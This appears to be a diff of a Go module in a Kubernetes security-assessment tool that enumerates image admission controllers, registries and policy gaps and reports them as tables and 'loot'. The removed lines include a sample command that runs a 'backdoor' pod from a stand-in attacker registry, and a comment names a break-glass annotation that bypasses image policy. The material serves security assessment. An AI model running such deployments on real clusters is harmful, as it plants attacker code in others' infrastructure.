-	loot.Section("ImageSources").Addf("# Unique Images: %d", imageSourceAnalysis.UniqueImages)
-	loot.Section("ImageSources").Addf("# Registries: %d (%d public, %d private)",
-		len(imageSourceAnalysis.RegistryBreakdown),
-		imageSourceAnalysis.PublicRegistryCount,
-		imageSourceAnalysis.PrivateRegistryCount)
-	loot.Section("ImageSources").Addf("# Using :latest tag: %d", imageSourceAnalysis.LatestTagCount)
-	loot.Section("ImageSources").Addf("# Digest pinned: %d", imageSourceAnalysis.DigestPinnedCount)
-	loot.Section("ImageSources").Addf("# Without digest: %d", imageSourceAnalysis.ImagesWithoutDigest)
-	loot.Section("ImageSources").Add("")
-
-	loot.Section("ImageSources").Add("# Registry breakdown:")
-	for registry, usage := range imageSourceAnalysis.RegistryBreakdown {
-		regType := "private"
-		if usage.IsPublic {
-			regType = "PUBLIC"
-		}
-		loot.Section("ImageSources").Addf("#   %s (%s): %d images, %d unique, %d :latest",
-			registry, regType, usage.ImageCount, len(usage.UniqueImages), usage.LatestCount)
-	}
-	loot.Section("ImageSources").Add("")
-
-	loot.Section("ImageSources").Add("# List all images in cluster:")
-	loot.Section("ImageSources").Add("kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{\"\\n\"}{end}' | sort -u")
-	loot.Section("ImageSources").Add("")
-	loot.Section("ImageSources").Add("# Find images using :latest:")
-	loot.Section("ImageSources").Add("kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{\" \"}{.metadata.name}{\" \"}{.spec.containers[*].image}{\"\\n\"}{end}' | grep -E ':latest|[^:]$'")
-	loot.Section("ImageSources").Add("")
-
-	// Public registry loot
-	loot.Section("PublicRegistries").Add("\n# ═══════════════════════════════════════════════════════════")
-	loot.Section("PublicRegistries").Add("# PUBLIC REGISTRIES DETECTED")
-	loot.Section("PublicRegistries").Add("# ═══════════════════════════════════════════════════════════")
-	loot.Section("PublicRegistries").Add("")
-
-	publicFound := false
-	for registry, usage := range imageSourceAnalysis.RegistryBreakdown {
-		if usage.IsPublic {
-			publicFound = true
-			blocked := policyEffectiveness.PublicRegistryBlocked[registry]
-			status := "[ALLOWED]"
-			if blocked {
-				status = "[BLOCKED]"
-			}
-
-			loot.Section("PublicRegistries").Addf("# %s %s", status, registry)
-			if name, ok := publicRegistries[registry]; ok {
-				loot.Section("PublicRegistries").Addf("#   Name: %s", name)
-			}
-			loot.Section("PublicRegistries").Addf("#   Images: %d | Unique: %d | Namespaces: %d",
-				usage.ImageCount, len(usage.UniqueImages), len(usage.Namespaces))
-
-			if usage.LatestCount > 0 {
-				loot.Section("PublicRegistries").Addf("#   WARNING: %d images using :latest tag", usage.LatestCount)
-			}
-
-			// Show sample images
-			if len(usage.UniqueImages) > 0 {
-				loot.Section("PublicRegistries").Add("#   Sample images:")
-				for i, img := range usage.UniqueImages {
-					if i >= 5 {
-						loot.Section("PublicRegistries").Addf("#     ... and %d more", len(usage.UniqueImages)-5)
-						break
-					}
-					loot.Section("PublicRegistries").Addf("#     - %s", img)
+			if entry.DeployCommand != "" {
+				loot.Section("Image-Admission-Deploy-Commands").Add("")
+				loot.Section("Image-Admission-Deploy-Commands").Addf("# %s - %s", entry.Controller, entry.PolicyName)
+				loot.Section("Image-Admission-Deploy-Commands").Addf("# Scope: %s, Pattern: %s", entry.Scope, entry.AllowedPattern)
+				if entry.Conditions != "" {
+					loot.Section("Image-Admission-Deploy-Commands").Addf("# Conditions: %s", entry.Conditions)
 				}
+				loot.Section("Image-Admission-Deploy-Commands").Add(entry.DeployCommand)
 			}
-			loot.Section("PublicRegistries").Add("")
 		}
 	}
 
-	if !publicFound {
-		loot.Section("PublicRegistries").Add("# No public registries detected - good security posture!")
-		loot.Section("PublicRegistries").Add("")
-	}
-
-	// If no controllers, show how to deploy from public registries
-	if len(controllers) == 0 && publicFound {
-		loot.Section("PublicRegistries").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("PublicRegistries").Add("# CRITICAL: No image admission - can deploy from ANY registry")
-		loot.Section("PublicRegistries").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("PublicRegistries").Add("")
-		loot.Section("PublicRegistries").Add("# Deploy from Docker Hub:")
-		loot.Section("PublicRegistries").Add("kubectl run test --image=alpine -- sleep 3600")
-		loot.Section("PublicRegistries").Add("")
-		loot.Section("PublicRegistries").Add("# Deploy from any registry:")
-		loot.Section("PublicRegistries").Add("kubectl run backdoor --image=attacker.registry.io/malicious:latest -- /malware")
-		loot.Section("PublicRegistries").Add("")
-	}
-
-	// Policy gaps loot
-	loot.Section("PolicyGaps").Add("\n# ═══════════════════════════════════════════════════════════")
-	loot.Section("PolicyGaps").Add("# POLICY GAPS ANALYSIS")
-	loot.Section("PolicyGaps").Add("# ═══════════════════════════════════════════════════════════")
-	loot.Section("PolicyGaps").Add("")
-	loot.Section("PolicyGaps").Addf("# Blocking Level: %s", policyEffectiveness.BlockingLevel)
-	loot.Section("PolicyGaps").Addf("# Reason: %s", policyEffectiveness.BlockingReason)
-	loot.Section("PolicyGaps").Add("")
-
-	if len(policyEffectiveness.UncoveredRegistries) > 0 {
-		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("PolicyGaps").Add("# UNCOVERED REGISTRIES (no policy)")
-		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
-		for _, reg := range policyEffectiveness.UncoveredRegistries {
-			loot.Section("PolicyGaps").Addf("# - %s", reg)
-		}
-		loot.Section("PolicyGaps").Add("")
-	}
-
-	if len(policyEffectiveness.WeakPolicies) > 0 {
-		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("PolicyGaps").Add("# WEAK POLICIES")
-		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
-		for _, weak := range policyEffectiveness.WeakPolicies {
-			loot.Section("PolicyGaps").Addf("# - %s", weak)
-		}
-		loot.Section("PolicyGaps").Add("")
-	}
-
-	if len(policyEffectiveness.WildcardAllows) > 0 {
-		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("PolicyGaps").Add("# WILDCARD ALLOW PATTERNS")
-		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
-		for _, wc := range policyEffectiveness.WildcardAllows {
-			loot.Section("PolicyGaps").Addf("# - %s", wc)
-		}
-		loot.Section("PolicyGaps").Add("")
-	}
-
-	if policyEffectiveness.UnsignedAllowed {
-		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("PolicyGaps").Add("# WARNING: UNSIGNED IMAGES ALLOWED")
-		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
-		loot.Section("PolicyGaps").Add("# Images without signatures can be deployed")
-		loot.Section("PolicyGaps").Add("# This allows supply chain attacks via compromised registries")
-		loot.Section("PolicyGaps").Add("")
-	}
-
-	// Recommendations loot
-	if len(policyEffectiveness.Recommendations) > 0 {
-		loot.Section("Recommendations").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Recommendations").Add("# SECURITY RECOMMENDATIONS")
-		loot.Section("Recommendations").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Recommendations").Add("")
-		for i, rec := range policyEffectiveness.Recommendations {
-			loot.Section("Recommendations").Addf("# %d. %s", i+1, rec)
-		}
-		loot.Section("Recommendations").Add("")
-	}
+	lootFiles := loot.Build()
 
 	// Build tables
 	tables := []internal.TableFile{
-		{
-			Name:   "Image-Admission-Summary",
-			Header: summaryHeaders,
-			Body:   summaryRows,
-		},
 		{
 			Name:   "Image-Admission-Controllers",
 			Header: controllerHeaders,
@@ -2289,31 +3183,236 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 		},
 	}
 
-	if len(registryRows) > 0 {
+	// Add images table
+	if len(imagesRows) > 0 {
 		tables = append(tables, internal.TableFile{
-			Name:   "Image-Registry-Breakdown",
-			Header: registryHeaders,
-			Body:   registryRows,
+			Name:   "Image-Admission-Images",
+			Header: imagesHeaders,
+			Body:   imagesRows,
 		})
 	}
 
-	if len(findingRows) > 0 {
+	// Add unified policies table (always shown)
+	if len(unifiedPoliciesRows) > 0 {
 		tables = append(tables, internal.TableFile{
 			Name:   "Image-Admission-Policies",
-			Header: findingHeaders,
-			Body:   findingRows,
+			Header: unifiedPoliciesHeaders,
+			Body:   unifiedPoliciesRows,
 		})
 	}
 
-	if len(allowedImagesRows) > 0 {
-		tables = append(tables, internal.TableFile{
-			Name:   "Image-Allowed-Images",
-			Header: allowedImagesHeaders,
-			Body:   allowedImagesRows,
-		})
-	}
+	// Detailed tables (only shown with --detailed flag)
+	if detailed {
+		if len(findingRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Policies-Detail",
+				Header: findingHeaders,
+				Body:   findingRows,
+			})
+		}
 
-	lootFiles := loot.Build()
+		if len(allowedImagesRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Allowed-Images",
+				Header: allowedImagesHeaders,
+				Body:   allowedImagesRows,
+			})
+		}
+
+		if len(blockedImagesRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Blocked-Images",
+				Header: blockedImagesHeaders,
+				Body:   blockedImagesRows,
+			})
+		}
+
+		// Cloud provider tables (only with --detailed and --cloud-provider)
+		if len(cloudPolicyRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Cloud-Policies",
+				Header: cloudPolicyHeaders,
+				Body:   cloudPolicyRows,
+			})
+		}
+
+		if len(gcpAttestorRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-GCP-Attestors",
+				Header: gcpAttestorHeaders,
+				Body:   gcpAttestorRows,
+			})
+		}
+
+		if len(awsScanConfigRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-AWS-ECR-Scan",
+				Header: awsScanConfigHeaders,
+				Body:   awsScanConfigRows,
+			})
+		}
+
+		if len(awsSignerProfileRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-AWS-Signer",
+				Header: awsSignerProfileHeaders,
+				Body:   awsSignerProfileRows,
+			})
+		}
+
+		// Security tool detailed tables
+		if len(aquaRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Aqua",
+				Header: aquaHeaders,
+				Body:   aquaRows,
+			})
+		}
+
+		if len(prismaRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Prisma",
+				Header: prismaHeaders,
+				Body:   prismaRows,
+			})
+		}
+
+		if len(sysdigRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Sysdig",
+				Header: sysdigHeaders,
+				Body:   sysdigRows,
+			})
+		}
+
+		if len(neuvectorRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-NeuVector",
+				Header: neuvectorHeaders,
+				Body:   neuvectorRows,
+			})
+		}
+
+		if len(stackroxRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-StackRox",
+				Header: stackroxHeaders,
+				Body:   stackroxRows,
+			})
+		}
+
+		if len(snykRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Snyk",
+				Header: snykHeaders,
+				Body:   snykRows,
+			})
+		}
+
+		if len(anchoreRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Anchore",
+				Header: anchoreHeaders,
+				Body:   anchoreRows,
+			})
+		}
+
+		if len(trivyRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Trivy",
+				Header: trivyHeaders,
+				Body:   trivyRows,
+			})
+		}
+
+		if len(notationRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Notation",
+				Header: notationHeaders,
+				Body:   notationRows,
+			})
+		}
+
+		if len(harborRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Harbor",
+				Header: harborHeaders,
+				Body:   harborRows,
+			})
+		}
+
+		if len(clairRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Clair",
+				Header: clairHeaders,
+				Body:   clairRows,
+			})
+		}
+
+		if len(wizRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Wiz",
+				Header: wizHeaders,
+				Body:   wizRows,
+			})
+		}
+
+		if len(laceworkRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Lacework",
+				Header: laceworkHeaders,
+				Body:   laceworkRows,
+			})
+		}
+
+		if len(cosignRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Cosign",
+				Header: cosignHeaders,
+				Body:   cosignRows,
+			})
+		}
+
+		if len(fluxImageRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Flux",
+				Header: fluxImageHeaders,
+				Body:   fluxImageRows,
+			})
+		}
+
+		if len(xrayRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-JFrogXray",
+				Header: xrayHeaders,
+				Body:   xrayRows,
+			})
+		}
+
+		if len(deepfenceRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Deepfence",
+				Header: deepfenceHeaders,
+				Body:   deepfenceRows,
+			})
+		}
+
+		if len(qualysRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-Qualys",
+				Header: qualysHeaders,
+				Body:   qualysRows,
+			})
+		}
+
+		if len(dockerScoutRows) > 0 {
+			tables = append(tables, internal.TableFile{
+				Name:   "Image-Admission-DockerScout",
+				Header: dockerScoutHeaders,
+				Body:   dockerScoutRows,
+			})
+		}
+	}
 
 	err := internal.HandleOutput(
 		"Kubernetes",
@@ -2419,15 +3518,13 @@ func analyzePortieris(ctx context.Context, clientset kubernetes.Interface, dynCl
 	// Verify webhook targets workloads
 	if !webhookTargetsWorkloads(whObject) {
 		controller.Status = "webhook-misconfigured"
-		controller.BypassRisk = "Webhook does not target workload resources"
 		return controller, policies
 	}
 
 	// Verify Portieris pods are running and verify images
-	podsRunning, podStatus, imageVerified := verifyPodsRunningWithImage(ctx, clientset, []string{"portieris", "ibm-system"}, "app=portieris", "portieris")
+	podsRunning, _, imageVerified := verifyPodsRunningWithImage(ctx, clientset, []string{"portieris", "ibm-system"}, "app=portieris", "portieris")
 	if !podsRunning {
 		controller.Status = "not-running"
-		controller.BypassRisk = fmt.Sprintf("Controller pods not running: %s", podStatus)
 		return controller, policies
 	}
 
@@ -2519,26 +3616,12 @@ func analyzePortieris(ctx context.Context, clientset kubernetes.Interface, dynCl
 	}
 
 	controller.SignatureReqs = false
-	allowAllFound := false
 	for _, p := range policies {
 		for _, r := range p.Repositories {
 			if r.Policy == "trust" {
 				controller.SignatureReqs = true
 			}
-			// Check for allow-all patterns
-			if r.Policy == "allow" && (r.Name == "*" || r.Name == "*/*" || r.Name == "**") {
-				allowAllFound = true
-			}
 		}
-	}
-
-	// Check for bypass risks
-	if controller.PolicyCount == 0 {
-		controller.BypassRisk = "No policies configured - all images allowed"
-	} else if allowAllFound {
-		controller.BypassRisk = "Allow-all policy found - verification can be bypassed"
-	} else if controller.FailurePolicy == "Ignore" {
-		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
 	}
 
 	return controller, policies
@@ -2589,19 +3672,17 @@ func analyzeConnaisseur(ctx context.Context, clientset kubernetes.Interface, dyn
 	// Verify webhook targets workloads
 	if !webhookTargetsWorkloads(whObject) {
 		controller.Status = "webhook-misconfigured"
-		controller.BypassRisk = "Webhook does not target workload resources"
 		return controller, policies
 	}
 
 	// Verify Connaisseur pods are running and verify images
-	podsRunning, podStatus, imageVerified := verifyPodsRunningWithImage(ctx, clientset, []string{"connaisseur"}, "app.kubernetes.io/name=connaisseur", "connaisseur")
+	podsRunning, _, imageVerified := verifyPodsRunningWithImage(ctx, clientset, []string{"connaisseur"}, "app.kubernetes.io/name=connaisseur", "connaisseur")
 	if !podsRunning {
 		// Try alternate label selector
-		podsRunning, podStatus, imageVerified = verifyPodsRunningWithImage(ctx, clientset, []string{"connaisseur"}, "app=connaisseur", "connaisseur")
+		podsRunning, _, imageVerified = verifyPodsRunningWithImage(ctx, clientset, []string{"connaisseur"}, "app=connaisseur", "connaisseur")
 	}
 	if !podsRunning {
 		controller.Status = "not-running"
-		controller.BypassRisk = fmt.Sprintf("Controller pods not running: %s", podStatus)
 		return controller, policies
 	}
 
@@ -2610,11 +3691,6 @@ func analyzeConnaisseur(ctx context.Context, clientset kubernetes.Interface, dyn
 	// Connaisseur uses ConfigMap for configuration
 	// We can try to parse it but it's YAML inside a ConfigMap
 	controller.SignatureReqs = true // Connaisseur is signature-focused
-
-	// Check for bypass risks
-	if controller.FailurePolicy == "Ignore" {
-		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
-	}
 
 	return controller, policies
 }
@@ -2664,19 +3740,17 @@ func analyzeRatify(ctx context.Context, clientset kubernetes.Interface, dynClien
 	// Verify webhook targets workloads
 	if !webhookTargetsWorkloads(whObject) {
 		controller.Status = "webhook-misconfigured"
-		controller.BypassRisk = "Webhook does not target workload resources"
 		return controller, policies
 	}
 
 	// Verify Ratify pods are running (could be in gatekeeper-system or ratify-system)
-	podsRunning, podStatus, imageVerified := verifyPodsRunningWithImage(ctx, clientset, []string{"gatekeeper-system", "ratify-system", "ratify"}, "app=ratify", "ratify")
+	podsRunning, _, imageVerified := verifyPodsRunningWithImage(ctx, clientset, []string{"gatekeeper-system", "ratify-system", "ratify"}, "app=ratify", "ratify")
 	if !podsRunning {
 		// Try Gatekeeper pods as Ratify often runs with Gatekeeper
-		podsRunning, podStatus, imageVerified = verifyPodsRunningWithImage(ctx, clientset, []string{"gatekeeper-system"}, "control-plane=controller-manager", "ratify")
+		podsRunning, _, imageVerified = verifyPodsRunningWithImage(ctx, clientset, []string{"gatekeeper-system"}, "control-plane=controller-manager", "ratify")
 	}
 	if !podsRunning {
 		controller.Status = "not-running"
-		controller.BypassRisk = fmt.Sprintf("Controller pods not running: %s", podStatus)
 		return controller, policies
 	}
 
@@ -2708,13 +3782,6 @@ func analyzeRatify(ctx context.Context, clientset kubernetes.Interface, dynClien
 	}
 
 	controller.SignatureReqs = true
-
-	// Check for bypass risks
-	if controller.PolicyCount == 0 {
-		controller.BypassRisk = "No verifiers configured - signature verification may not be active"
-	} else if controller.FailurePolicy == "Ignore" {
-		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
-	}
 
 	return controller, policies
 }
@@ -2763,18 +3830,16 @@ func analyzeKritis(ctx context.Context, clientset kubernetes.Interface, dynClien
 	// Verify webhook targets workloads
 	if !webhookTargetsWorkloads(whObject) {
 		controller.Status = "webhook-misconfigured"
-		controller.BypassRisk = "Webhook does not target workload resources"
 		return controller, policies
 	}
 
 	// Verify Kritis pods are running
-	podsRunning, podStatus := verifyPodsRunning(ctx, clientset, []string{"kritis", "kritis-system"}, "app=kritis")
+	podsRunning, _ := verifyPodsRunning(ctx, clientset, []string{"kritis", "kritis-system"}, "app=kritis")
 	if !podsRunning {
-		podsRunning, podStatus = verifyPodsRunning(ctx, clientset, []string{"kritis", "kritis-system"}, "app.kubernetes.io/name=kritis")
+		podsRunning, _ = verifyPodsRunning(ctx, clientset, []string{"kritis", "kritis-system"}, "app.kubernetes.io/name=kritis")
 	}
 	if !podsRunning {
 		controller.Status = "not-running"
-		controller.BypassRisk = fmt.Sprintf("Controller pods not running: %s", podStatus)
 		return controller, policies
 	}
 
@@ -2815,23 +3880,6 @@ func analyzeKritis(ctx context.Context, clientset kubernetes.Interface, dynClien
 	}
 
 	controller.SignatureReqs = true
-
-	// Check for bypass risks
-	hasDefaultAllow := false
-	for _, p := range policies {
-		if p.DefaultAllow {
-			hasDefaultAllow = true
-			break
-		}
-	}
-
-	if controller.PolicyCount == 0 {
-		controller.BypassRisk = "No ImageSecurityPolicies configured"
-	} else if hasDefaultAllow {
-		controller.BypassRisk = "Policy has imageAllowlist enabled - images can bypass attestation"
-	} else if controller.FailurePolicy == "Ignore" {
-		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
-	}
 
 	return controller, policies
 }
@@ -2882,16 +3930,10 @@ func analyzeImagePolicyWebhook(ctx context.Context, dynClient dynamic.Interface)
 	// Verify webhook targets workloads
 	if !webhookTargetsWorkloads(whObject) {
 		controller.Status = "webhook-misconfigured"
-		controller.BypassRisk = "Webhook does not target workload resources"
 		return controller
 	}
 
 	controller.Status = "active"
-
-	// Check for bypass risks
-	if controller.FailurePolicy == "Ignore" {
-		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
-	}
 
 	return controller
 }
@@ -2926,17 +3968,11 @@ func analyzeImagePolicyEngines(ctx context.Context, dynClient dynamic.Interface)
 					action = vfa
 				}
 
-				bypassRisk := ""
-				if strings.ToLower(action) == "audit" {
-					bypassRisk = "Audit only"
-				}
-
 				findings = append(findings, ImagePolicyFinding{
 					Controller: "Kyverno",
 					PolicyName: name,
 					Scope:      "Cluster",
 					Policy:     action,
-					BypassRisk: bypassRisk,
 				})
 			}
 		}
@@ -2986,17 +4022,11 @@ func analyzeImagePolicyEngines(ctx context.Context, dynClient dynamic.Interface)
 								action = ea
 							}
 
-							bypassRisk := ""
-							if action == "dryrun" || action == "warn" {
-								bypassRisk = fmt.Sprintf("%s mode", action)
-							}
-
 							findings = append(findings, ImagePolicyFinding{
 								Controller: "Gatekeeper",
 								PolicyName: fmt.Sprintf("%s/%s", kind, c.GetName()),
 								Scope:      "Cluster",
 								Policy:     action,
-								BypassRisk: bypassRisk,
 							})
 						}
 					}
@@ -3054,18 +4084,16 @@ func analyzeSigstorePolicyController(ctx context.Context, clientset kubernetes.I
 	// Verify webhook targets workloads
 	if !webhookTargetsWorkloads(whObject) {
 		controller.Status = "webhook-misconfigured"
-		controller.BypassRisk = "Webhook does not target workload resources"
 		return controller, policies
 	}
 
 	// Verify Sigstore Policy Controller pods are running
-	podsRunning, podStatus := verifyPodsRunning(ctx, clientset, []string{"cosign-system", "sigstore-system", "policy-controller-system"}, "app=policy-controller")
+	podsRunning, _ := verifyPodsRunning(ctx, clientset, []string{"cosign-system", "sigstore-system", "policy-controller-system"}, "app=policy-controller")
 	if !podsRunning {
-		podsRunning, podStatus = verifyPodsRunning(ctx, clientset, []string{"cosign-system", "sigstore-system"}, "control-plane=policy-controller")
+		podsRunning, _ = verifyPodsRunning(ctx, clientset, []string{"cosign-system", "sigstore-system"}, "control-plane=policy-controller")
 	}
 	if !podsRunning {
 		controller.Status = "not-running"
-		controller.BypassRisk = fmt.Sprintf("Controller pods not running: %s", podStatus)
 		return controller, policies
 	}
 
@@ -3192,23 +4220,6 @@ func analyzeSigstorePolicyController(ctx context.Context, clientset kubernetes.I
 
 	controller.SignatureReqs = true
 
-	// Check for bypass risks
-	warnModeFound := false
-	for _, p := range policies {
-		if strings.ToLower(p.Mode) == "warn" {
-			warnModeFound = true
-			break
-		}
-	}
-
-	if controller.PolicyCount == 0 {
-		controller.BypassRisk = "No ClusterImagePolicies configured"
-	} else if warnModeFound {
-		controller.BypassRisk = "Policy in warn mode - violations are logged but not blocked"
-	} else if controller.FailurePolicy == "Ignore" {
-		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
-	}
-
 	return controller, policies
 }
 
@@ -3292,16 +4303,11 @@ func analyzeGCPBinaryAuthorization(ctx context.Context, dynClient dynamic.Interf
 	// Verify webhook targets workloads
 	if !webhookTargetsWorkloads(whObject) {
 		controller.Status = "webhook-misconfigured"
-		controller.BypassRisk = "Webhook does not target workload resources"
 		return controller
 	}
 
 	controller.Status = "active"
 
-	// Check for bypass risks
-	if controller.FailurePolicy == "Ignore" {
-		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
-	}
 
 	// Binary Authorization in GKE is cluster-level and managed via GCP console/gcloud
 	// Note: Break-glass annotation can bypass: alpha.image-policy.k8s.io/break-glass: "true"
@@ -3386,7 +4392,6 @@ func analyzeAquaSecurity(ctx context.Context, clientset kubernetes.Interface, dy
 		controller.ImageVerified = imageVerified
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	// Check for Aqua CRDs (ClusterConfigAuditReports, etc.)
@@ -3458,7 +4463,6 @@ func analyzePrismaCloud(ctx context.Context, clientset kubernetes.Interface, dyn
 		controller.ImageVerified = imageVerified
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	// Check for Defender DaemonSet as additional verification
@@ -3525,7 +4529,6 @@ func analyzeSysdigSecure(ctx context.Context, clientset kubernetes.Interface, dy
 		controller.Namespace = ns
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -3582,7 +4585,6 @@ func analyzeNeuVector(ctx context.Context, clientset kubernetes.Interface, dynCl
 		controller.Namespace = ns
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	// Check for NeuVector CRDs (required for policy verification)
@@ -3602,18 +4604,11 @@ func analyzeNeuVector(ctx context.Context, clientset kubernetes.Interface, dynCl
 
 			if mode, ok, _ := unstructured.NestedString(rule.Object, "spec", "mode"); ok {
 				policy.Mode = mode
-				// Monitor mode doesn't block
-				if strings.ToLower(mode) == "monitor" {
-					controller.BypassRisk = "Mode is Monitor (not blocking)"
-				}
 			}
 
 			policies = append(policies, policy)
 			controller.PolicyCount++
 		}
-	} else if controller.Status == "active" {
-		// Webhook exists, pods running, but no CRD policies
-		controller.BypassRisk = "No admission control rules configured"
 	}
 
 	return controller, policies
@@ -3692,7 +4687,6 @@ func analyzeStackRox(ctx context.Context, clientset kubernetes.Interface, dynCli
 		controller.Namespace = ns
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	// Check for admission-control deployment specifically
@@ -3759,7 +4753,6 @@ func analyzeSnykContainer(ctx context.Context, clientset kubernetes.Interface, d
 		controller.Namespace = ns
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -3817,7 +4810,6 @@ func analyzeAnchore(ctx context.Context, clientset kubernetes.Interface, dynClie
 		controller.Namespace = ns
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -3899,14 +4891,11 @@ func analyzeTrivyOperator(ctx context.Context, clientset kubernetes.Interface, d
 			controller.Status = "active"
 		} else {
 			controller.Status = "scan-only"
-			controller.BypassRisk = "Scan-only mode (no admission blocking)"
 		}
 	} else if hasVulnReports || hasConfigReports {
 		controller.Status = "reports-only"
-		controller.BypassRisk = "Reports exist but no running operator"
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods"
 	}
 
 	if hasVulnReports {
@@ -3968,7 +4957,6 @@ func analyzeKubewarden(ctx context.Context, clientset kubernetes.Interface, dynC
 		controller.Namespace = ns
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	// Get ClusterAdmissionPolicies
@@ -4037,13 +5025,6 @@ func analyzeKubewarden(ctx context.Context, clientset kubernetes.Interface, dynC
 		}
 	}
 
-	// Check if any policies exist
-	if controller.PolicyCount == 0 && controller.Status == "active" {
-		controller.BypassRisk = "No policies configured"
-	} else if imageRelatedPolicies == 0 && controller.PolicyCount > 0 {
-		controller.BypassRisk = "No image-related policies found"
-	}
-
 	return controller, policies
 }
 
@@ -4100,7 +5081,6 @@ func analyzeNotation(ctx context.Context, clientset kubernetes.Interface, dynCli
 		controller.Namespace = ns
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	// Check for trust policy configmaps
@@ -4114,10 +5094,6 @@ func analyzeNotation(ctx context.Context, clientset kubernetes.Interface, dynCli
 				}
 			}
 		}
-	}
-
-	if controller.PolicyCount == 0 && controller.Status == "active" {
-		controller.BypassRisk = "No trust policies found"
 	}
 
 	return controller, policies
@@ -4176,7 +5152,6 @@ func analyzeHarbor(ctx context.Context, clientset kubernetes.Interface, dynClien
 		controller.Namespace = ns
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -4269,11 +5244,6 @@ func analyzeAWSSigner(ctx context.Context, clientset kubernetes.Interface, dynCl
 		}
 	}
 
-	// If only annotation-based (no webhook), note the limitation
-	if controller.Name != "" && controller.Status == "annotation-based" {
-		controller.BypassRisk = "Annotation-based only (no admission webhook enforcement)"
-	}
-
 	return controller, policies
 }
 
@@ -4333,7 +5303,6 @@ func analyzeAzurePolicy(ctx context.Context, clientset kubernetes.Interface, dyn
 				controller.Namespace = ns
 			} else {
 				controller.Status = "webhook-only"
-				controller.BypassRisk = "Webhook exists but no running pods found"
 			}
 		}
 	}
@@ -4388,11 +5357,6 @@ func analyzeAzurePolicy(ctx context.Context, clientset kubernetes.Interface, dyn
 		}
 	}
 
-	// Verify we have image-related policies
-	if controller.Name != "" && imageRelatedConstraints == 0 {
-		controller.BypassRisk = "No image-related constraints configured"
-	}
-
 	return controller, policies
 }
 
@@ -4413,7 +5377,7 @@ func analyzeClair(ctx context.Context, clientset kubernetes.Interface, dynClient
 		for _, wh := range whList.Items {
 			name := wh.GetName()
